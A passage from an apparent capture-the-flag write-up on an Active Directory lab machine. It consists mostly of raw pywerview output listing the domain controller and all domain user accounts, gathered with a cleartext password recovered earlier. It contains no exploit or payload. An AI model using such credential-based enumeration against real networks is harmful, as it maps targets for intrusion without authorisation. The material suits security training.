                               ldap/cc4f3c4e-7c1c-40be-9aa9-3bd9a7837869._msdcs.MEGACORP.LOCAL
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    282695
usncreated:                    12293
whenchanged:                   2021-11-24 15:05:16
whencreated:                   2019-09-25 13:20:05
```

### Domain Computers

The target domain controller appears to be the only computer account in the domain.

```bash
$ pywerview get-netcomputer -w megacorp.local -u tushikikatomo -p finance1 --dc-ip 10.129.95.200 --full-data
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            MULTIMASTER
codepage:                      0
countrycode:                   0
displayname:                   MULTIMASTER$
distinguishedname:             CN=MULTIMASTER,OU=Domain Controllers,DC=MEGACORP,DC=LOCAL
dnshostname:                   MULTIMASTER.MEGACORP.LOCAL
dscorepropagationdata:         2019-09-28 21:09:32,
                               2019-09-25 21:27:58,
                               2019-09-25 13:20:06,
                               1601-01-01 18:16:33
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-24 18:04:49.556695
lastlogontimestamp:            132822399166853568
localpolicyflags:              0
logoncount:                    381
msdfsr-computerreferencebl:    CN=FSMO,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=MEGACORP,DC=LOCAL
msds-additionaldnshostname:    CATCH$,
                               FSMO$,
                               MULTIMASTER$
msds-generationid:             35,
                               1,
                               20,
                               79,
                               76,
                               206,
                               185,
                               244
msds-supportedencryptiontypes: 28
name:                          MULTIMASTER
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    15fee192-c56e-4a55-b'b04f'-0019ad2d038c
objectsid:                     S-1-5-21-3167813660-1240564177-918740779-1000
operatingsystem:               Windows Server 2016 Standard
operatingsystemversion:        10.0 (14393)
primarygroupid:                516
pwdlastset:                    2021-11-24 10:05:04.982208
ridsetreferences:              CN=RID Set,CN=MULTIMASTER,OU=Domain Controllers,DC=MEGACORP,DC=LOCAL
samaccountname:                MULTIMASTER$
samaccounttype:                805306369
serverreferencebl:             CN=MULTIMASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/MULTIMASTER.MEGACORP.LOCAL,
                               TERMSRV/MULTIMASTER,
                               TERMSRV/MULTIMASTER.MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/ForestDnsZones.MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/DomainDnsZones.MEGACORP.LOCAL,
                               DNS/MULTIMASTER.MEGACORP.LOCAL,
                               GC/MULTIMASTER.MEGACORP.LOCAL/MEGACORP.LOCAL,
                               RestrictedKrbHost/MULTIMASTER.MEGACORP.LOCAL,
                               HOST/MULTIMASTER.MEGACORP.LOCAL/MEGACORP,
                               HOST/MULTIMASTER.MEGACORP.LOCAL,
                               HOST/MULTIMASTER.MEGACORP.LOCAL/MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/MEGACORP,
                               ldap/MULTIMASTER.MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/MEGACORP.LOCAL,
                               ldap/CATCH/ForestDnsZones.MEGACORP.LOCAL,
                               HOST/CATCH/MEGACORP.LOCAL,
                               ldap/CATCH/DomainDnsZones.MEGACORP.LOCAL,
                               GC/CATCH/MEGACORP.LOCAL,
                               ldap/CATCH/MEGACORP.LOCAL,
                               HOST/CATCH/MEGACORP,
                               ldap/CATCH/MEGACORP,
                               RestrictedKrbHost/CATCH,
                               HOST/CATCH,
                               ldap/CATCH,
                               ldap/FSMO/MEGACORP,
                               HOST/FSMO/MEGACORP.LOCAL,
                               ldap/FSMO/ForestDnsZones.MEGACORP.LOCAL,
                               HOST/FSMO/MEGACORP,
                               ldap/MULTIMASTER/ForestDnsZones.MEGACORP.LOCAL,
                               ldap/FSMO/DomainDnsZones.MEGACORP.LOCAL,
                               HOST/MULTIMASTER/MEGACORP.LOCAL,
                               ldap/MULTIMASTER/DomainDnsZones.MEGACORP.LOCAL,
                               GC/MULTIMASTER/MEGACORP.LOCAL,
                               ldap/FSMO/MEGACORP.LOCAL,
                               GC/FSMO/MEGACORP.LOCAL,
                               ldap/MULTIMASTER/MEGACORP.LOCAL,
                               RestrictedKrbHost/FSMO,
                               HOST/FSMO,
                               ldap/FSMO,
                               HOST/MULTIMASTER/MEGACORP,
                               ldap/MULTIMASTER/MEGACORP,
                               RestrictedKrbHost/MULTIMASTER,
                               HOST/MULTIMASTER,
                               ldap/MULTIMASTER,
                               RPC/cc4f3c4e-7c1c-40be-9aa9-3bd9a7837869._msdcs.MEGACORP.LOCAL,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/cc4f3c4e-7c1c-40be-9aa9-3bd9a7837869/MEGACORP.LOCAL,
                               ldap/cc4f3c4e-7c1c-40be-9aa9-3bd9a7837869._msdcs.MEGACORP.LOCAL
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    282695
usncreated:                    12293
whenchanged:                   2021-11-24 15:05:16
whencreated:                   2019-09-25 13:20:05
```

### Domain Users

No interesting descriptions, user account control attributes, or service principal names set.

```bash
$ pywerview get-netuser -w megacorp.local -u tushikikatomo -p finance1 --dc-ip 10.129.95.200
accountexpires:                0
admincount:                    1
badpasswordtime:               2021-08-19 09:17:58.866498
badpwdcount:                   0
cn:                            Administrator
codepage:                      0
countrycode:                   0
description:                   Built-in account for administering the computer/domain
distinguishedname:             CN=Administrator,CN=Users,DC=MEGACORP,DC=LOCAL
dscorepropagationdata:         2019-09-28 21:09:32,
                               2019-09-25 21:27:58,
                               2019-09-25 13:35:15,
                               2019-09-25 13:35:15,
                               1601-01-01 00:00:00
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-24 18:32:36.230709
lastlogontimestamp:            132822399105915991
logoncount:                    46166
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:                      CN=Group Policy Creator Owners,CN=Users,DC=MEGACORP,DC=LOCAL,
                               CN=Domain Admins,CN=Users,DC=MEGACORP,DC=LOCAL,
                               CN=Enterprise Admins,CN=Users,DC=MEGACORP,DC=LOCAL,
                               CN=Schema Admins,CN=Users,DC=MEGACORP,DC=LOCAL,
                               CN=Administrators,CN=Builtin,DC=MEGACORP,DC=LOCAL
msds-supportedencryptiontypes: 0
name:                          Administrator
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    6c5bda1d-9908-40d8-b'b5f2'-43b2000f7c75
objectsid:                     S-1-5-21-3167813660-1240564177-918740779-500
primarygroupid:                513
profilepath:
pwdlastset:                    2019-09-28 17:09:13.173261
samaccountname:                Administrator
samaccounttype:                805306368
scriptpath:
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:                    282691
usncreated:                    8196
whenchanged:                   2021-11-24 15:05:10
whencreated:                   2019-09-25 13:19:22

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     Guest
codepage:               0
countrycode:            0
description:            Built-in account for guest access to the computer/domain
distinguishedname:      CN=Guest,CN=Users,DC=MEGACORP,DC=LOCAL
dscorepropagationdata:  2019-09-28 21:09:32,
                        2019-09-25 21:27:58,
                        2019-09-25 13:20:06,
                        1601-01-01 18:16:33
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Guests,CN=Builtin,DC=MEGACORP,DC=LOCAL
name:                   Guest
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             567071d7-37a9-475c-b'8f78'-5eb3811da155
objectsid:              S-1-5-21-3167813660-1240564177-918740779-501
primarygroupid:         514
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         Guest
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8197
usncreated:             8197
whenchanged:            2019-09-25 13:19:22
whencreated:            2019-09-25 13:19:22

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     DefaultAccount
codepage:               0
countrycode:            0
description:            A user account managed by the system.
distinguishedname:      CN=DefaultAccount,CN=Users,DC=MEGACORP,DC=LOCAL
dscorepropagationdata:  2019-09-28 21:09:32,
                        2019-09-25 21:27:58,
                        2019-09-25 13:20:06,
                        1601-01-01 18:16:33
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=System Managed Accounts Group,CN=Builtin,DC=MEGACORP,DC=LOCAL
name:                   DefaultAccount
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             1d1114eb-b5d1-486a-b'b7dd'-0d85c5ebaebb
objectsid:              S-1-5-21-3167813660-1240564177-918740779-503
primarygroupid:         513
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         DefaultAccount
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8198
usncreated:             8198
whenchanged:            2019-09-25 13:19:22
whencreated:            2019-09-25 13:19:22

accountexpires:                9223372036854775807
admincount:                    1
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            krbtgt
codepage:                      0
countrycode:                   0
description:                   Key Distribution Center Service Account
distinguishedname:             CN=krbtgt,CN=Users,DC=MEGACORP,DC=LOCAL
dscorepropagationdata:         2019-09-28 21:09:32,
                               2019-09-25 21:27:58,
                               2019-09-25 13:35:15,
                               2019-09-25 13:20:06,
                               1601-07-14 04:20:16
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     1600-12-31 19:03:58
logoncount:                    0
memberof:                      CN=Denied RODC Password Replication Group,CN=Users,DC=MEGACORP,DC=LOCAL
msds-supportedencryptiontypes: 0
name:                          krbtgt
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    08a5346d-8ed9-48a6-b'bd13'-630066023f00
objectsid:                     S-1-5-21-3167813660-1240564177-918740779-502
primarygroupid:                513
profilepath:
pwdlastset:                    2019-09-25 09:20:06.075644
samaccountname:                krbtgt
samaccounttype:                805306368
scriptpath:
serviceprincipalname:          kadmin/changepw
showinadvancedviewonly:        TRUE
useraccountcontrol:            ['ACCOUNTDISABLE', 'NORMAL_ACCOUNT']
usnchanged:                    12770
usncreated:                    12324
whenchanged:                   2019-09-25 13:35:15
whencreated:                   2019-09-25 13:20:06

accountexpires:                9223372036854775807
badpasswordtime:               2021-11-24 18:12:15.071386
badpwdcount:                   3
cn:                            svc-nas
codepage:                      0
countrycode:                   0
displayname:                   svc-nas
distinguishedname:             CN=svc-nas,OU=Service Accounts,DC=MEGACORP,DC=LOCAL
dscorepropagationdata:         2019-09-28 21:09:32,
                               2019-09-25 22:13:06,
                               2019-09-25 22:00:16,
                               2019-09-25 21:27:58,
                               1601-01-01 00:00:00
givenname:                     svc-nas
homedirectory:
instancetype:                  4
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2019-09-25 16:48:42.910134
lastlogontimestamp:            132139181229101335
logoncount:                    1
msds-supportedencryptiontypes: 0
name:                          svc-nas
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    a5185647-733d-4371-b'8c66'-c804fe90cb1c
objectsid:                     S-1-5-21-3167813660-1240564177-918740779-1103
primarygroupid:                513
profilepath:
pwdlastset:                    2019-09-28 17:36:56.395266
samaccountname:                svc-nas
samaccounttype:                805306368
scriptpath:
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:             svc-nas@MEGACORP.LOCAL
usnchanged:                    41065
usncreated:                    16444
whenchanged:                   2019-09-28 21:47:39
whencreated:                   2019-09-25 19:46:05

accountexpires:        9223372036854775807
badpasswordtime:       2021-11-24 18:25:08.397206
badpwdcount:           0
cn:                    Tushikikatomo Akira
codepage:              0
countrycode:           0
displayname:           Tushikikatomo Akira
distinguishedname:     CN=Tushikikatomo Akira,OU=Tokyo,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-03-09 10:11:21,
                       2019-09-28 21:15:00,
                       2019-09-28 21:09:32,
                       2019-09-25 21:27:58,
                       1601-07-14 22:32:32
givenname:             Tushikikatomo
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             2021-11-24 18:25:13.490107
lastlogontimestamp:    132822690622951954
logoncount:            0
memberof:              CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL
name:                  Tushikikatomo Akira
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            d4f8b95f-27a5-404f-b'abbb'-2df50f91967c
objectsid:             S-1-5-21-3167813660-1240564177-918740779-1110
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 20:02:03.098663
samaccountname:        tushikikatomo
samaccounttype:        805306368
scriptpath:            drives.vbs
sn:                    Akira
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     tushikikatomo@MEGACORP.LOCAL
usnchanged:            283542
usncreated:            16591
whenchanged:           2021-11-24 23:11:02
whencreated:           2019-09-25 21:00:18

accountexpires:        9223372036854775807
badpasswordtime:       2021-11-24 18:12:13.860998
badpwdcount:           3
cn:                    Andrew Wick
codepage:              0
countrycode:           0
displayname:           Andrew Wick
distinguishedname:     CN=Andrew Wick,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2019-09-28 21:09:32,
                       2019-09-25 21:27:58,
                       2019-09-25 21:01:48,
                       1601-01-01 00:04:17
givenname:             Andrew
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Andrew Wick
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            80cae862-0437-42ae-b'860c'-2f2be8ac0646
objectsid:             S-1-5-21-3167813660-1240564177-918740779-1111
primarygroupid:        513
profilepath:
pwdlastset:            2019-09-28 19:43:00.506863
samaccountname:        andrew
samaccounttype:        805306368
scriptpath:
sn:                    Wick
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     andrew@MEGACORP.LOCAL
usnchanged:            45107
usncreated:            16603
whenchanged:           2019-09-28 23:43:00
whencreated:           2019-09-25 21:01:48

accountexpires:        9223372036854775807
badpasswordtime:       2021-11-24 18:12:14.408067
badpwdcount:           3
cn:                    Lana Murphy
codepage:              0
countrycode:           0
displayname:           Lana Murphy
distinguishedname:     CN=Lana Murphy,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2019-09-28 21:15:04,
                       2019-09-28 21:13:19,
                       2019-09-28 21:13:07,
                       2019-09-28 21:13:02,
                       1601-01-01 00:00:00
givenname:             Lana
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Lana Murphy
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            46332783-d07c-45e9-b'a724'-720b58525bbc
objectsid:             S-1-5-21-3167813660-1240564177-918740779-1112
primarygroupid:        513
profilepath:
pwdlastset:            2019-09-28 19:42:03.115961
samaccountname:        lana
samaccounttype:        805306368
scriptpath:
sn:                    Murphy
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     lana@MEGACORP.LOCAL
usnchanged:            45105
usncreated:            16612
whenchanged:           2019-09-28 23:42:03
whencreated:           2019-09-25 21:03:15

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Alice Chong
codepage:              0
countrycode:           0
displayname:           Alice Chong
distinguishedname:     CN=Alice Chong,OU=Frankfurt,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2019-09-28 21:16:52,
                       2019-09-28 21:16:22,
                       2019-09-28 21:09:32,
                       2019-09-25 22:04:53,
                       1601-01-01 18:12:16
givenname:             Alice
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Alice Chong
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            d5ce67b0-05f4-4eef-b'85e4'-dc86b8b20311
objectsid:             S-1-5-21-3167813660-1240564177-918740779-1601
primarygroupid:        513
profilepath:
pwdlastset:            2019-09-28 19:40:45.834593
samaccountname:        alice
samaccounttype:        805306368
scriptpath:
sn:                    Chong
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     alice@MEGACORP.LOCAL
usnchanged:            45103
usncreated:            28704
whenchanged:           2019-09-28 23:40:45
whencreated:           2019-09-25 22:04:53

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Dai Aki
codepage:              0
countrycode:           0
displayname:           Dai Aki
distinguishedname:     CN=Dai Aki,OU=Tokyo,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2019-09-28 21:24:41,
                       1601-01-01 00:00:00
givenname:             Dai
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Dai Aki
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            78df6a98-2d70-4a83-b'8f4c'-98491795220f
objectsid:             S-1-5-21-3167813660-1240564177-918740779-2101
primarygroupid:        513
profilepath:
pwdlastset:            2019-09-28 17:24:41.378198
samaccountname:        dai
samaccounttype:        805306368
scriptpath:
sn:                    Aki
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     dai@MEGACORP.LOCAL
usnchanged:            41025
usncreated:            41019
whenchanged:           2019-09-28 21:24:41
whencreated:           2019-09-28 21:24:41

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    svc-sql
codepage:              0
countrycode:           0
displayname:           svc-sql
distinguishedname:     CN=svc-sql,OU=Service Accounts,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2019-09-28 21:44:56,
                       1601-01-01 00:00:00
givenname:             svc-sql
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  svc-sql
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            beebe806-a674-48d9-b'95be'-63028dad220b
objectsid:             S-1-5-21-3167813660-1240564177-918740779-2102
primarygroupid:        513
profilepath:
pwdlastset:            2019-09-28 17:46:00.036952
samaccountname:        svc-sql
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     svc-sql@MEGACORP.LOCAL
usnchanged:            41050
usncreated:            41042
whenchanged:           2019-09-28 21:46:00
whencreated:           2019-09-28 21:44:56

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Sarina Bauer
codepage:              0
countrycode:           0
displayname:           Sarina Bauer
distinguishedname:     CN=Sarina Bauer,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:31:24,
                       2020-01-09 12:22:43,
                       1601-01-01 00:00:00
givenname:             Sarina
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
lastlogontimestamp:    132230923565686802
logoncount:            0
memberof:              CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL,
                       CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL
name:                  Sarina Bauer
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            548955df-e515-41c1-b'9afa'-8130103570e2
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3102
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 19:56:31.316766
samaccountname:        sbauer
samaccounttype:        805306368
scriptpath:
sn:                    Bauer
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     sbauer@MEGACORP.LOCAL
usnchanged:            110706
usncreated:            90294
whenchanged:           2020-01-10 01:12:36
whencreated:           2020-01-09 12:22:43

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Octavia Kent
codepage:              0
countrycode:           0
displayname:           Octavia Kent
distinguishedname:     CN=Octavia Kent,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:09,
                       2020-01-09 12:23:09,
                       1601-01-01 00:00:00
givenname:             Octavia
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Octavia Kent
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            7541a8b3-c658-47dc-b'bd1a'-944ffcb87c57
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3103
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:23:09.856514
samaccountname:        okent
samaccounttype:        805306368
scriptpath:
sn:                    Kent
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     okent@MEGACORP.LOCAL
usnchanged:            90448
usncreated:            90304
whenchanged:           2020-01-09 12:32:09
whencreated:           2020-01-09 12:23:09

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Christian Kane
codepage:              0
countrycode:           0
displayname:           Christian Kane
distinguishedname:     CN=Christian Kane,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:31:24,
                       2020-01-09 12:23:35,
                       1601-01-01 00:00:00
givenname:             Christian
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Christian Kane
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            3fd29878-c194-42fd-b'8671'-2611ea69d077
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3104
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:23:35.903432
samaccountname:        ckane
samaccounttype:        805306368
scriptpath:
sn:                    Kane
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     ckane@MEGACORP.LOCAL
usnchanged:            90445
usncreated:            90313
whenchanged:           2020-01-09 12:31:24
whencreated:           2020-01-09 12:23:35

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Kimberly Page
codepage:              0
countrycode:           0
displayname:           Kimberly Page
distinguishedname:     CN=Kimberly Page,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:32,
                       2020-01-09 12:24:16,
                       1601-01-01 00:00:00
givenname:             Kimberly
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Kimberly Page
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            56e7fff4-a5a3-4772-b'96f4'-77c3386962aa
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3105
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:24:16.966170
samaccountname:        kpage
samaccounttype:        805306368
scriptpath:
sn:                    Page
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     kpage@MEGACORP.LOCAL
usnchanged:            90455
usncreated:            90322
whenchanged:           2020-01-09 12:32:32
whencreated:           2020-01-09 12:24:16

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    James Houston
codepage:              0
countrycode:           0
displayname:           James Houston
distinguishedname:     CN=James Houston,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:09,
                       2020-01-09 12:24:43,
                       1601-01-01 00:00:00
givenname:             James
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  James Houston
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            8af6523d-4f32-4b5e-b'baa4'-cf8c5b97528e
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3106
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:24:43.903698
samaccountname:        james
samaccounttype:        805306368
scriptpath:
sn:                    Houston
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     james@MEGACORP.LOCAL
usnchanged:            90451
usncreated:            90331
whenchanged:           2020-01-09 12:32:09
whencreated:           2020-01-09 12:24:43

accountexpires:        9223372036854775807
badpasswordtime:       2020-01-09 15:02:51.394831
badpwdcount:           0
cn:                    Connor York
codepage:              0
countrycode:           0
displayname:           Connor York
distinguishedname:     CN=Connor York,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:31:24,
                       2020-01-09 12:25:03,
                       1601-01-01 00:00:00
givenname:             Connor
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             2021-11-24 10:05:39.122900
lastlogontimestamp:    132822399391228998
logoncount:            32
memberof:              CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL
name:                  Connor York
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            6c3c78ec-7e0a-48be-b'95d7'-edd410457515
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3107
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 14:57:08.378530
samaccountname:        cyork
samaccounttype:        805306368
scriptpath:
sn:                    York
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     cyork@MEGACORP.LOCAL
usnchanged:            282722
usncreated:            90340
whenchanged:           2021-11-24 15:05:39
whencreated:           2020-01-09 12:25:03

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Reya Martin
codepage:              0
countrycode:           0
displayname:           Reya Martin
distinguishedname:     CN=Reya Martin,OU=Frankfurt,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:17,
                       2020-01-09 12:25:27,
                       1601-01-01 00:00:00
givenname:             Reya
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Reya Martin
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
